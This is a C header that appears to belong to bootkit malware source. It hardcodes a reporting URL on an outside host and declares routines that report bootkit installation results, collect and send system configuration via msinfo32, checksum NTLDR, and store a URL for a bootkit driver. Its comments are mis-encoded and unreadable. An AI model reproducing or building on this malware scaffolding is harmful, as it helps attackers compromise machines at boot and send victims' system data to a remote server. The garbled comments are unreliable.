#ifndef UUID_E4500F5134534F79A3663021D13CDBC8
#define UUID_E4500F5134534F79A3663021D13CDBC8

#define PP_REPORT_URL  "http://srgsgsg.info/geter/index_.php"

#define DBGRPT_ENABLED

#ifdef DBGRPT_ENABLED
#	define PP_DBGRPT_FUNCTION_CALL(function) { (function); };
#else 
#	define PP_DBGRPT_FUNCTION_CALL(function) __noop
#endif

// �-��� ������������� �������� ���������
void DebugReportInit();

// ������ � ����������� � ������� (����� ���������� ������������ ������� � �������)
void DebugReportSystem();

// ������ � ����������� � ���� ���������
void DebugReportBkInstallCode(DWORD BkInstallResult);

// ������ �� ������� ����������� �����
void DebugReportStepByName(const char* StepName);

void DebugReportStep1();
void DebugReportStep2(DWORD BkInstallResult);

// ������ � ����������� � MD5 ����� NTLDR
void DebugReportUpdateNtldrCheckSum();

// �������� ������ ��������� ���������� (��������� ������ msinfo32.exe)
void DebugReportCreateConfigReportAndSend();

// ���������� URL, ������� ����� ������������ ������� ������� ��� ������� �� ����
bool DebugReportSaveUrlForBootkitDriver();

// ���������� ���������� ��� ������, ������� ������������� ��������� ��������������� �������
void DebugReportSaveSettings(const char* ParamsList);

// ������ ������ ��� ��������� ����������� ������
void DebugReportRunTests();

char* CalcNtldrMd5(char* Buffer, DWORD BufferSize);

#endif // #ifndef UUID_E4500F5134534F79A3663021D13CDBC8